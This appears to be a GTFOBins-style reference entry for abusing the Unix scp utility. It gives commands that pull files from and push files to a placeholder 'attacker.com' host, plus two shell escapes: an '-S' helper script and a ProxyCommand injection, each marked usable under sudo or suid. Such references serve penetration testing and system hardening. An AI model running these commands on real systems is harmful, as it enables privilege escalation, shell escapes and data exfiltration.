---
type: gtfobin
name: scp
platform: Unix
functions: [download, shell, upload]
tags: [gtfobin, unix, lotl]
---

# scp

## download

```bash
scp user@attacker.com:/path/to/input-file /path/to/output-file
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
chmod +x /path/to/temp-file
scp -S /path/to/temp-file x x:
```
**Contexts:** sudo, suid, unprivileged

```bash
scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
```
**Contexts:** sudo, suid, unprivileged

## upload

```bash
scp /path/to/input-file user@attacker.com:/path/to/output-file
```
**Contexts:** sudo, suid, unprivileged
